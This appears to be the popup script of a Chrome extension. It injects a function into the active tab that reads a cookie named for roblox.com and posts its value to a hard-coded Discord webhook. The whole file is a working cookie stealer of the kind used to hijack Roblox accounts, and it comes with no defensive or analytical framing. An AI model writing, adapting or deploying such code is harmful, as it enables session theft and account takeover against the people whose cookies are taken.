document.addEventListener('DOMContentLoaded', function () {
  const sendButton = document.getElementById('sendButton');

  sendButton.addEventListener('click', () => {
    // Replace 'YOUR_COOKIE_NAME' with the name of the cookie you want to access
    const cookieName = 'www.roblox.com';
    
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        function: copyCookie,
        args: [cookieName],
      });
    });
  });
});

function copyCookie(cookieName) {
  const cookieValue = document.cookie
    .split('; ')
    .find((row) => row.startsWith(`${cookieName}=`))
    ?.split('=')[1];

  if (cookieValue) {
    // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1154144199193665762/PQd6BDDDFcw3kKn6uIZwtl8B5zE_PPc2_fwaAijrV9nZViQkVHpHb_Mvll_efrExEZnh';

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ cookieValue }),
    })
      .then((response) => {
        if (response.ok) {
          alert('Cookie sent to Discord successfully!');
        } else {
          alert('Error sending cookie to Discord.');
        }
      })
      .catch((error) => {
        alert('Error: ' + error);
      });
  } else {
    alert('Cookie not found.');
  }
}
